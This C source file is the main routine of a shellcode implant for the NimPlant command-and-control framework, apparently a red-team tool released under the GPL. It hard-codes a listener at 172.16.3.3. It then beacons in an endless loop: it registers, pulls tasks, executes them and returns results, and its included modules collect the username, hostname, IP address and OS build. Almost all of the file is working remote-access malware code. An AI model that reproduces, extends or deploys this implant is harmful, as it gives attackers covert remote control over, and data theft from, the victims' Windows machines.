/**
 * GNU General Public License, version 2.0.
 *
 * Copyright (c) 2025 Tijme Gommers (@tijme).
 *
 * This source code file is part of C-implant for NimPlant C2. 
 * Licensed under GNU General Public License, version 2.0, and 
 * you are free to use, modify, and distribute this file under 
 * its terms. However, any modified versions of this file must 
 * include this same license and copyright notice.
 */

/**
 * Standard Input Output.
 * 
 * Defines three variable types, several macros, and various functions for performing input and output.
 * https://www.tutorialspoint.com/c_standard_library/stdio_h.htm
 */
#include <stdio.h>

/**
 * Standard Library.
 * 
 * Defines four variable types, several macros, and various functions for performing general functions.
 * https://www.tutorialspoint.com/c_standard_library/stdlib_h.htm
 */
#include <stdlib.h>

/**
 * Booleans.
 * 
 * Defines boolean types.
 * https://pubs.opengroup.org/onlinepubs/007904975/basedefs/stdbool.h.html
 */
#include <stdbool.h>

/**
 * Used by the Windows Sockets API.
 * 
 * Contains declarations for the Winsock API, including functions, macros, data structures, 
 * and constants used for network programming on Windows.
 * 
 * https://learn.microsoft.com/en-us/windows/win32/api/winsock2/
 */
#include <winsock2.h>

/**
 * Windows API.
 * 
 * Contains declarations for all of the functions, macro's & data types in the Windows API.
 * https://docs.microsoft.com/en-us/previous-versions//aa383749(v=vs.85)?redirectedfrom=MSDN
 */
#include <windows.h>

/**
 * Used by the Windows HTTP services.
 * 
 * Contains manifests, macros, types and prototypes for Windows HTTP Services.
 * https://learn.microsoft.com/en-us/windows/win32/api/winhttp/
 */
#include <winhttp.h>

/**
 * Used by the IP Helper API.
 * 
 * Contains manifests, macros, types and prototypes for the IP Helper API.
 * https://learn.microsoft.com/en-us/windows/win32/api/iphlpapi/
 */
#include <iphlpapi.h>

/**
 * Include header files defining Windows API functions to import as well as NimPlant structs.
 */
#include "imports.h"
#include "nimplant.h"

/**
 * Include Relocatable helper functions.
 * 
 * This include must be used before any other code than the above. It
 * contains the first instructions of the shellcode that will ensure that 
 * the `__main` function is called correctly upon running the shellcode.
 */
#include "../inc/relocatable.c"
#include "../inc/relocatable-stdlib.c"

/**
 * Include functions to populate module & function tables.
 */
#include "imports.c"
#include "nimplant.c"

/**
 * Include vendor libraries.
 */
#include "../lib/base64.c"
#include "../lib/aes.c"
#include "../lib/json-create.c"
#include "../lib/json-parse.c"

/**
 * Include custom helper libraries.
 */
#include "../inc/config.c"
#include "../inc/http.c"
#include "../inc/crypto.c"
#include "../inc/metadata/internal_ip.c"
#include "../inc/metadata/username.c"
#include "../inc/metadata/hostname.c"
#include "../inc/metadata/os_build.c"
#include "../inc/metadata/process_name.c"
#include "../inc/commands/cat.c"
#include "../inc/commands/cd.c"
#include "../inc/commands/cp.c"
#include "../inc/commands/ls.c"
#include "../inc/commands/mv.c"
#include "../inc/commands/pwd.c"
#include "../inc/commands/whoami.c"
#include "../inc/client.c"

/**
 * The main function of our shellcode.
 * 
 * Using `InitializeRelocatable`, two Windows API functions are at our disposal.
 * Using these two functions, we can further utilize the Windows API.
 * - HMODULE context.functions.LoadLibraryA([in] LPCSTR lpLibFileName);
 * - FARPROC context.functions.GetProcAddress([in] HMODULE hModule, [in] LPCSTR lpProcName);
 * 
 * @returns int The resulting status
 */
int __main () {
    struct Relocatable context;
    struct NimPlantConfig config;
    struct NimPlantClient client;

    // NimPlant config
    int ListenerType = 0;
    DEFINE_WSTRING(ListenerHostname, "172.16.3.3");
    DEFINE_WSTRING(ListenerIP, "172.16.3.3");
    int ListenerPort = 80;
    DEFINE_WSTRING(ListenerRegisterPath, "/register");
    DEFINE_WSTRING(ListenerTaskPath, "/task");
    DEFINE_WSTRING(ListenerResultPath, "/result");
    bool NimPlantRiskyMode = false;
    bool NimPlantSleepMask = false;
    int NimPlantSleepTime = 2;
    int NimPlantSleepJitter = 0;
    DEFINE_WSTRING(NimPlantKillDate, "2050-01-01");
    DEFINE_WSTRING(NimPlantUserAgent, "NimPlant C2 Client");
    uint64_t XorKey = 1;

    // Initialize relocatable
    InitializeRelocatable(&context);

    // Populate semi-global variables with, e.g, module & function references
    PopulateModuleAndFunctionTables(&context);
    PopulateNimPlantConfig(
        &config, 
        ListenerType, 
        ListenerHostname, 
        ListenerIP, 
        ListenerPort, 
        ListenerRegisterPath, 
        ListenerTaskPath, 
        ListenerResultPath, 
        NimPlantRiskyMode, 
        NimPlantSleepMask,
        NimPlantSleepTime,
        NimPlantSleepJitter,
        NimPlantKillDate,
        NimPlantUserAgent,
        XorKey
    );

    // Set `rand` seed
    context.functions.srand(context.functions.time(NULL));

    // Define NimPlant lifecycle-runtime variables
    struct NimPlantTask* lpGotTask = NULL;
    bool bClientInitialized = false;
    bool bClientRegistered = false;

    // Enter the NimPlant lifecycle
    while (true) {

        // Initialize the beacon if not initialized yet
        if (!bClientInitialized) {
            bClientInitialized = InitializeNimPlantClient(&context, &config, &client);
        }

        // Register the beacon if not registered yet
        if (!bClientRegistered) {
            bClientRegistered = RegisterNimPlantClient(&context, &config, &client);
        }

        // Retrieve a task (if a new one is available)
        lpGotTask = GetTaskForNimPlantClient(&context, &config, &client);
        if (lpGotTask == NULL) goto END_OF_LOOP;

        // Execute the given task (if a new one is available)
        bool bResult = ExecuteTaskForNimPlantClient(&context, &config, &client, lpGotTask);
        PostTaskForNimPlantClient(&context, &config, &client, lpGotTask, bResult);
        
        // Remove the task
        FreeTask(&context, lpGotTask);
        lpGotTask = NULL;

        // Sleep
        END_OF_LOOP:
        context.functions.Sleep(config.NimPlantSleepTime * 1000);
        
    }

    return false;
}
